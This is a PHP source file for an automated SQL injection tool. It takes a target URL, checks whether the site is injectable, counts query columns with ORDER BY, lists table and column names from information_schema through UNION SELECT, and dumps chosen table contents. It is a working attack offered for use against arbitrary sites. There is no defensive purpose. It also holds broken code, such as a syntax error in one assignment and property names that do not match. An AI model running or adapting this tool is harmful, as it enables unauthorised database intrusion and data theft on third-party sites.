<?php
/**
 * 
 * @author rco
 *
 */

/** @var Hack hack */
$hack = new Hack();
$hack->action();

class Hack 
{
	/** @var string is hackable */
	const CHECK_IS_HACKABLE_ACTION 		= 'check_is_hackable_action';
	
	/** @var string how much action */
	const GET_HOW_MUCH_COLS_ACTION 		= 'get_how_much_cols_action';
	
	/** @var string get table name */
	const GET_TABLES_NAME_ACTION 		= 'get_tables_name_action';
	
	/** @var string get cols name */
	const GET_COLS_NAME_ACTION 			= 'get_cols_name_action';
	
	/** @var string get final data */
	const GET_FINAL_DATA_ACTION 		= 'get_final_data_action';
	
	/** @var string get log data */
	const GET_LOG_ACTION 				= 'get_log_action';
	
	/** @var string is hackable */
	const NBR_POTENTIAL_COL_ITERATION	= 50;
	
	/** @var string current action */
	protected $action 					= "";
	
	/** @var string current url */
	protected $url 						= "";
	
	/** @var string suffix  */
	protected $suffix 					= "";
	
	/** @var string file name */
	protected $filepath					=  "/var/log/process.log";
	
	/**
	 * construct
	 */
	public function __construct()
	{
		$this->filepath = dirname(__FILE__) . $this->filepath;
	}
	
	/**
	 * action : main function
	 *
	 * @return string
	 */
	public function action()
	{
		if (!isset($_GET['action']) || !in_array($_GET['action'], $this->getAvailablesAction())) {
			return $this->sendResponse(['error' => 'Action not available']);
		} 
		
		$this->url 	= (isset($_GET['url'])) ? base64_decode($_GET['url']) : null; 
		
		if ($this->url  === null || $this->checkUrl($this->url) !== 1) {
			return $this->sendResponse(['error' => 'Url is incorrect']);
		}
		
		$this->_action 	= $_GET['action'];
		
		$method 		= lcfirst(str_replace(' ','',ucwords(str_replace('_',' ', $this->action))));
		
		if (method_exists($this, $method)) {
			$this->$method();
		} else {
			return $this->sendResponse(['error' => 'Method not available']);
		}
	}
	
	/**
	 * check Is Hackable
	 *
	 * @return string
	 */
	protected function checkIsHackableAction()
	{
		$data 				= [];
		$url 				= $this->url . '+and+1=0--';
		$before 			= $this->call($url);
		$url				= $this->url . '+and+1=1--';
		$after 				= $this->call($url);
		$data['success'] 	= (strlen($before) != strlen($after)) ? 1 : 0;
		$data['url_call'] 	= $url;
		
		return $this->sendResponse($data);
	}
	
	/**
	 * get how Much Cols
	 *
	 * @return string
	 */
	protected function getHowMuchColsAction()
	{
		$nbrCols 	= 0;
		$data 		= [];

		for ($i=1;$i<=self::NBR_POTENTIAL_COL_ITERATION;$i++) {
			$url = $this->url . '+order+by+' .$i.'--';
			$content = $this->call($url);
			
			$this->log('Search for col : ' . $i);
			
			if (strrpos($content, 'mysql_fetch_array()') !== false) {
				$nbrCols = $i - 1;
				$this->log('FIND for col : ' . $nbrCols);
				break;
			}
		}
		
		$data['nbr_cols'] 	= $nbrCols;
		$data['url_call']	= $url;
		
		return $this->sendResponse($data);
	}
	
	/**
	 * get Tables Name
	 * 
	 * @return string
	 */
	protected function getTablesNameAction()
	{
		$data = errors = $cols = [];
		
		if (!isset($_GET['nbr_cols'])) {
			$errors['error'][] = 'Int for nbr cols is required';
		} 
		
		if (empty($errors)) {
			$nbrCols = $_GET['nbr_cols'];
			
			for ($i = 1; $i<=$nbrCols; $i++) {
				$cols[] = 'group_concat(distinct+table_name+order+by+table_name+asc)';
			}
			
			$url = preg_replace('#=([0-9]+)$#', '=-1', $this->url) . '+union+select+' . implode(',', $cols) . '+from+information_schema.tables--';
			
			$content = utf8_encode($this->call($url));
			
			$content = $this->getUpperCaseInfo($content);
			
			$data['tables']	 	= $content;
			$data['url_call']	= $url;
			
			return $this->sendResponse($data);
		}
		
		return $this->sendResponse($errors);
	}
	
	/**
	 * get cols Name
	 * 
	 * @return string
	 */
	protected function getColsNameAction()
	{
		$errors = $cols = [];
		
		if (!isset($_GET['nbr_cols'])) {
			$errors['error'][] = 'Int for nbr cols is required';
		}
		
		if (!isset($_GET['table'])) {
			$errors['error'][] = 'Table name is required';
		}
	
		if (empty($errors)) {
			$tableName 	= $this->asciiConvertor($_GET['table']);
			$nbrCols 	= $_GET['nbr_cols'];
			
			for ($i = 1; $i<=$nbrCols; $i++) {
				$cols[] = 'group_concat(column_name)';
			}
			
			$url = preg_replace('#=([0-9]+)$#', '=-1', $this->url) . '+union+select+' . implode(',', $cols)
			. '+from+information_schema.columns+where+table_name='.$tableName.'--';
			
			$content = utf8_encode($this->call($url));
			$content = $this->getUpperCaseInfo($content);
			
			$data['columns'] 	= $content;
			$data['url_call'] 	= $url;
			
			return $this->sendResponse($data);
		}
		return $this->sendResponse($errors);
	}
	
	/**
	 * get final data
	 *
	 * @return string
	 */
	protected function getFinalDataAction()
	{
		$errors = $cols = [];
		
		if (!isset($_GET['nbr_cols'])) {
			$errors['error'][] = 'Int for nbr cols is required';
		}
	
		if (!isset($_GET['table'])) {
			$errors['error'][] = 'Table name is required';
		}
		
		if (!isset($_GET['col'])) {
			$errors['error'][] = 'Col name is required';		
		}
		
		if (empty($errors)) {
			
			$tableName 	= $_GET['table'];
			$nbrCols 	= $_GET['nbr_cols'];
			$colName	= explode(',',$_GET['col']);
			
			for ($i = 1; $i<=$nbrCols; $i++) {
				$z = $i - 1;
				
				if (!isset($colName[$z])) {
					$colName[$z] = $colName[0];
				}
				
				$cols[] = 'CONVERT('.$colName[$z].' USING utf8)';
			}
			
			$url = preg_replace('#=([0-9]+)$#', '=-1', $this->url) . '+union+select+' . implode(',', $cols)
			. '+from+'.$tableName. $this->getSuffixTable() . '--';
			
			$content = utf8_encode($this->call($url));
			
			$data['content'] 	= $content;
			$data['url_call'] 	= $url;
			
			return $this->sendResponse($data);
		}

		return $this->sendResponse($errors);
	}
	
	/**
	 * get log
	 *
	 * @return string
	 */
	protected function getLogAction()
	{
		$data = [];
		$data['content'] = file_get_contents($this->filepath);
		return $this->sendResponse($data);
	}
	
	/**
	 * log
	 *
	 * @param unknown_type $msg
	 */
	private function log($msg)
	{
		$fd = fopen($this->_filepath, "w");
		$str = "[" . date("Y/m/d h:i:s", mktime()) . "] " . $msg;
		fwrite($fd, $str . "\n");
		fclose($fd);
	}
	
	/**
	 * get suffix table
	 *
	 * @return string
	 */
	protected function getSuffixTable()
	{
		return $this->getSuffix('table');
	}
	
	/**
	 * set suffix table
	 * 
	 * @param string $suffix
	 * 
	 * @return Hack
	 */
	protected function setSuffixTable($suffix)
	{
		return $this->setSuffix($suffix, 'table');
	}
	
	/**
	 * set suffix
	 *
	 * @param string $suffix suffix
	 * @param string $key    key
	 * 
	 * @return Hack
	 */
	private function setSuffix($suffix, $key)
	{
		$this->suffix[$key] = $suffix;
		return $this;
	}
	
	/**
	 * get suffix
	 * 
	 * @param string $key
	 */
	private function getSuffix($key)
	{
		return (isset($this->suffix[$key])) ? $this->suffix[$key] : "";
	}
	
	/**
	 * get uppercase info
	 *
	 * @return string
	 */
	private function getUpperCaseInfo($content)
	{
		$result = "";
		$matches = [];
		
		if (preg_match_all("/([A-Za-z0-9_]+)([,]?)/", $content, $matches)) {
			foreach ($matches as $match) {
					foreach ($match as $data) {
					$result .= $data . '<br />';
				}
			}
		}
		return $result;
	}
	
	/**
	 * get available action
	 *
	 * @return array
	 */
	protected function getAvailablesAction()
	{
		return [
			self::CHECK_IS_HACKABLE_ACTION,
			self::GET_HOW_MUCH_COLS_ACTION,
			self::GET_TABLES_NAME_ACTION,
			self::GET_COLS_NAME_ACTION,
			self::GET_FINAL_DATA_ACTION,
		];
	}
	
	/**
	 * get string convert into ascii char
	 * 
	 * @param string $string string to convert
	 * 
	 * @return string
	 */
	protected function asciiConvertor($string)
	{
		$convertors = [];
		
		for ($i = 0; $i<strlen($string); $i++) {
			$convertors[] = ord($string[$i]);
		}
		
		return 'char(' . implode(',', $convertors) . ')';
	}
	
	/**
	 * check url
	 *
	 * @param string $url url to check
	 *
	 * @return boolean
	 */
	private function checkUrl($url)
	{
		return preg_match("/\b(?:(?:https?|ftp):\/\/|www\.)[-a-z0-9+&@#\/%?=~_|!:,.;]*[-a-z0-9+&@#\/%=~_|]/i", $url);
	}
	
	/**
	 * send response
	 * 
	 * @param array $data data to send
	 * 
	 * @return void
	 */
	protected function sendResponse($data)
	{
		header('Content-Type: application/json');
		
		$data = json_encode($data);
		
		if ($data === false) {
			throw new Exception('Json encode failed, error ID : ' . json_last_error());
		}
		
		echo $data;	
		exit();	
	}
	
	/**
	 * call distant page via http
	 *
	 * @param string $url url to call
	 *
	 * @return string
	 */
	private function call($url)
	{
		return strip_tags(file_get_contents($url));
	}
}
